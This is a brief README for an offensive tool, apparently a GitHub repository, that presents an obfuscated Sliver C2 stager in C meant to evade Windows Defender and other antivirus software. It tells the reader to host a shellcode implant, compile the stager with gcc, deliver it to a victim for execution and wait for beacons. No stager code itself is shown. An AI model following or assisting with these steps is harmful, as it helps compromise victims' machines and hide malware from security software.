# Sliver-C2_stager
<b>An obfuscated Sliver C2 stager written in C program to bypass Windows Defender and certain AVs.</b>

1. <i>Generate a shellcode implant and host it </i>

![alt text](https://github.com/vivashu27/Sliver-C2_stager/blob/main/1.png)

2. <i>Compile the stager and deliver it to the victim for execution </i>

```
gcc.exe <stager_c2>.c -o <steger_c2>.exe -lwininet </code>
```

![alt text](https://github.com/vivashu27/Sliver-C2_stager/blob/main/2.png)

3. <i>Watch out for the beacons ;-) </i>

![alt text](https://github.com/vivashu27/Sliver-C2_stager/blob/main/3.png)
